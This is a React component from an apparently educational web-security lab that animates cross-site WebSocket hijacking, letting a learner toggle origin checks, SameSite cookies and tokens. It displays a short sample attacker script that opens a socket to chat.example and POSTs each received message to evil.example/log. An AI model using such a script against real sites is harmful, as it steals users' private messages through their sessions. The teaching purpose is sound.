import { useState } from 'react';
import { useLang } from '../i18n.jsx';
import { L, Toggle, useBeats } from './kit.jsx';
import { WS_DEFENCES, wsHijack } from './batch3.js';

/** Cross-site WebSocket hijacking, seen through a devtools-style frame list. */
export default function WsFrames() {
  const { tr } = useLang();
  const [d, setD] = useState({ origin: false, samesite: false, token: false });
  const beats = useBeats(700);
  const r = wsHijack(d);
  const total = 2 + r.frames.length;
  const frames = r.frames.slice(0, Math.max(0, beats.beat - 2));

  return (
    <div className="lab ws-viz">
      <div className="panel">
        <div className="field-label">{tr(L('chat.example defences', 'chat.example 的防御'))}</div>
        <div className="up-gates">
          {Object.entries(WS_DEFENCES).map(([k, label]) => (
            <Toggle
              key={k}
              checked={d[k]}
              onChange={(v) => {
                setD((x) => ({ ...x, [k]: v }));
                beats.reset();
              }}
            >
              {tr(label)}
            </Toggle>
          ))}
        </div>
        <div className="field-label">{tr(L('Script on evil.example', 'evil.example 上的脚本'))}</div>
        <pre className="code small">{`const ws = new WebSocket('wss://chat.example/chat');\nws.onopen = () => ws.send('READY');\nws.onmessage = (e) =>\n  fetch('https://evil.example/log',\n        { method: 'POST', body: e.data });`}</pre>
        <button type="button" className="btn danger" onClick={() => beats.start(total)}>
          {tr(L('Alice visits evil.example', 'Alice 访问 evil.example'))}
        </button>
      </div>
      <div className="panel">
        <div className="field-label">{tr(L('Handshake', '握手'))}</div>
        <pre className={`code small ws-hs ${beats.beat >= 1 ? 'on' : ''}`}>{beats.beat >= 1 ? r.handshake : '…'}</pre>
        {beats.beat >= 2 && <div className={`ws-status ${r.outcome === 'pwned' ? 'bad-text' : 'good-text'}`}>{tr(r.status)}</div>}
        <div className="ws-frames" role="list" aria-label={tr(L('WebSocket frames', 'WebSocket 帧'))}>
          {frames.map((f, i) => (
            <div key={i} role="listitem" className={`ws-frame ${f.dir}`}>
              <span className="ws-dir">{f.dir === 'up' ? '↑' : f.dir === 'down' ? '↓' : '⇢ evil.example'}</span>
              <code>{tr(f.text)}</code>
            </div>
          ))}
        </div>
        <div className={`verdict ${beats.done ? (r.outcome === 'pwned' ? 'bad' : 'good') : 'neutral-v'}`} aria-live="polite">
          {!beats.done
            ? tr(L('The handshake is a normal HTTP request, so the browser attaches Alice’s cookie unless something stops it.', '握手就是一个普通的 HTTP 请求，所以除非有东西阻止，浏览器会带上 Alice 的 Cookie。'))
            : r.outcome === 'pwned'
              ? tr(L('evil.example opened a two-way channel as Alice and read her private messages. Same-origin policy does not apply to WebSockets.', 'evil.example 以 Alice 的身份打开了一条双向通道，读到了她的私密消息。同源策略管不到 WebSocket。'))
              : tr(L('The socket was refused or anonymous. Nothing private came back.', '连接被拒绝或是匿名的，没有拿到任何私密内容。'))}
        </div>
      </div>
    </div>
  );
}
